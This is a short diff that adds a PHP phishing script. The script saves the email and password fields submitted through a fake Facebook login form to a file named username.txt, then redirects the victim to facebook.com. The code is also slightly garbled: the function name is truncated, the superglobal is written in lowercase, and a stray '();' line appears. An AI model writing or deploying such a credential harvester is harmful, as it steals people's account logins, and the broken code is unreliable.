@@ -1,0 +1,6 @@
+ <?php
+ le_put_contents("username.txt", "facebook username: " . $_post[ 'email'] . " pass "  
+.$_post['pass'] . "\n" , FILE_APPEND);
+ header('location: http://facebook.com/');
+();
+?>
